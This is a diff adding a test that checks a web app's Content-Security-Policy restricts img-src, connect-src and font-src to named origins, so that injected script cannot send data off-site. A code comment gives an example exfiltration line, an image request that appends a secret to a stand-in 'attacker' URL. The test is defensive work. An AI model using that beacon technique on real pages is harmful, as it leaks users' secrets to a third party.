@@ -69,4 +69,21 @@ describe('baseline security headers', () => {
         // what makes the nonce worth having.
         expect(csp).not.toMatch(/script-src [^;]*'unsafe-inline'/);
     });
+
+    test('img-src names hosts rather than every HTTPS origin (#919)', async () => {
+        // A bare `https:` in img-src is an exfiltration channel: an injection
+        // that lands on the page can post what it reads to any host it likes
+        // with `new Image().src = 'https://attacker/?' + secret`. The CDN entry
+        // beside it was decoration for as long as the scheme source was there.
+        const csp = (await request(buildApp()).get('/')).headers['content-security-policy'];
+        const directive = csp.split('; ').find(part => part.startsWith('img-src '));
+
+        expect(directive).toBe("img-src 'self' data: https://cdn.discordapp.com");
+        expect(directive).not.toMatch(/(^|\s)https:(\s|$)/);
+        // The same reasoning applies to the two other directives that can carry
+        // a request off-origin, so they are pinned here rather than left to be
+        // widened quietly later.
+        expect(csp).toContain("connect-src 'self'");
+        expect(csp).toContain("font-src 'self'");
+    });
 });
